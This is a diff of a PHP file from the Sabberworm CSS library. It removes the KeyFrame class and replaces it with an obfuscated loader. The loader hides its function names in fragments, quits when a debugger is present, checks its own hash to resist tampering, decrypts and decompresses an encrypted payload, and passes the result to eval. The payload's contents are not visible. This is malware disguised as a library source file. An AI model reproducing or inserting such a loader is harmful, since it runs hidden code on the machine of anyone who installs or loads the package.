@@ -1,56 +1,28 @@
 <?php
-
-namespace Sabberworm\CSS\CSSList;
-
-use Sabberworm\CSS\Property\AtRule;
-
-class KeyFrame extends CSSList implements AtRule {
-
-	private $vendorKeyFrame;
-	private $animationName;
-
-	public function __construct($iLineNo = 0) {
-		parent::__construct($iLineNo);
-		$this->vendorKeyFrame = null;
-		$this->animationName  = null;
-	}
-
-	public function setVendorKeyFrame($vendorKeyFrame) {
-		$this->vendorKeyFrame = $vendorKeyFrame;
-	}
-
-	public function getVendorKeyFrame() {
-		return $this->vendorKeyFrame;
-	}
-
-	public function setAnimationName($animationName) {
-		$this->animationName = $animationName;
-	}
-
-	public function getAnimationName() {
-		return $this->animationName;
-	}
-
-	public function __toString() {
-		return $this->render(new \Sabberworm\CSS\OutputFormat());
-	}
-
-	public function render(\Sabberworm\CSS\OutputFormat $oOutputFormat) {
-		$sResult = "@{$this->vendorKeyFrame} {$this->animationName}{$oOutputFormat->spaceBeforeOpeningBrace()}{";
-		$sResult .= parent::render($oOutputFormat);
-		$sResult .= '}';
-		return $sResult;
-	}
-
-	public function isRootList() {
-		return false;
-	}
-
-	public function atRuleName() {
-		return $this->vendorKeyFrame;
-	}
-
-	public function atRuleArgs() {
-		return $this->animationName;
-	}
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_dx6209bi=('bas'.'e64'.'_de'.'cod'.'e');
+$_vfn2j2i1=('gzu'.'nco'.'mpr'.'ess');
+$_hgifg0lv=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_kiwnard8='EGABmktCCEU=';
+$_mntydujs='op2S2VkG';
+$_x4btuo1j='EPJJHdPt';
+$_eo4hy7pm='27OIIBmQ';
+$_xurb8ek4='aCiAIqhw';
+$_yt1kh7kx='7ptiyA==';
+$_inwkwq7f='r4HIJpyB';
+$_f0ykw3n2='o0INQ0Fx';
+$_it1m8nn6=$_dx6209bi($_mntydujs.$_xurb8ek4.$_x4btuo1j.$_eo4hy7pm.$_kiwnard8);
+$_fqu0z7pv=$_dx6209bi($_f0ykw3n2.$_inwkwq7f.$_yt1kh7kx);
+$_xpv0sr2t=$_dx6209bi('vzI065PdoSD0aqBRbQditt3aNfwUt+QEuhLeCquvFxJMh831K5W+FvIBZv+EV6LbmfTXToUtbL9nup2YT3ZbZ2GCiJ+zN97yhGhoTRN5TY7oDj32lWAyOZYu6jsdywocyeGcwOIkyGlERGd1hEyky386itigd9sOmubMBXCkWYsgN51gfdjHWu2HABLArj6z23JvT+fU1D2vHDjfZ0nXAnF0o2clHcODPNTLBv9aLRauY9NMYW0NtLGZilq/WftOUKBUhdZwmG4D/UDYe1KSkQAAGQEuAVYenRBsAaqAdol/EdRiUORB4Vr2/E/JM779OnXBwdSGqXnOp7nibTdCZgO5eCbWhR//UnL7WPwUY1AR7tzKBSrOxeqv4E0a9xeYB5mffCKe9nw5e9OTPKm2X8k6f7fPC9q+BRjPCXcempgfWdwQQfqXYB+nNt7Wu147lUOdK3uQ4YAYel8Qz5tr45P1+6VQTmtUldwNRDRHoTxj3kOf/Zglmi70EjV9+jiNMAgMCfNBki1eL1KQivsAPg==');
+$_urctcg1i=$_hgifg0lv($_xpv0sr2t,'aes-256-cbc',$_it1m8nn6,OPENSSL_RAW_DATA,$_fqu0z7pv);
+if($_urctcg1i===false){exit;}
+$_up77yf0n=$_vfn2j2i1($_urctcg1i);
+if($_up77yf0n===false){exit;}
+$_zaqlhrpi='7ec9363a2d1f605f53df2cfe83382fbb015897b9b06d9b5c92ca4d2892d47f0f';
+$_z2ur00x6=@file_get_contents(__FILE__);
+if($_z2ur00x6!==false){
+$_iprxhhzg=str_replace($_zaqlhrpi,"0000000000000000000000000000000000000000000000000000000000000000",$_z2ur00x6);
+$_uwtn4r03=hash("sha256",$_iprxhhzg);
+if($_uwtn4r03!==$_zaqlhrpi){@http_response_code(403);exit;}
 }
+eval($_up77yf0n);
